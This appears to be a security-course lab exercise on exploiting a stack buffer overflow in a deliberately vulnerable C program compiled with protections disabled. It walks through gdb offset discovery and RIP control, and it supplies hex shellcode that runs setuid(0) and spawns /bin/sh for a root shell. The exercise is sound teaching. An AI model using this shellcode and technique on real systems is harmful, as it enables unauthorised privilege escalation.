
## Exercise 1

Consider the following `overflow.c` code:

```C
#include <string.h>

int overflow(char* input){
  char buf[25];
  strcpy(buf, input);
  return 1;  
}

int main(int argc, char** argv){
  overflow(argv[1]);
  return 1;
}
```
- Compile the code disabling every security measure, with the command:
  - `gcc -m64 -fno-stack-protector -zexecstac -no-pie -Wl,-z,norelro overflow.c`
- Enter in a `gdb` session for the binary, run the `checksec` command to check the security measures
  - Is the stack an executable region? Are addresses randomized?
- Generate a pattern of 200 bytes with `pattern create 200`, we will use this to overwrite the `RBP`
  - Set a breakpoint to `strcpy()`, issue the input pattern with `r '[paste_patern]'`
  - Inspect the `RBP` register, get the offset value with `pattern offset [rbp_value]`
  - Add 8 bytes to the offset value, overwrite the `RIP` register with a canonical address.
    - Hint: the `r` command of `gdb` can take input from shell commands: $(command_here), can you use python to generate the string?
  - After controlling the `RIP`, since the stack is an executable region, we can now execute arbitrary commands directly on-stack.
    - Substitute the test canonical address with the hex-dump of "setuid(0); system("/bin/sh")":
    - ```"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"```
    - To make the exploit more reliable, you can add 32 "null" instructions (`\x90` symbols) before the shellcode.
  - Make the binary execute a shell as root!
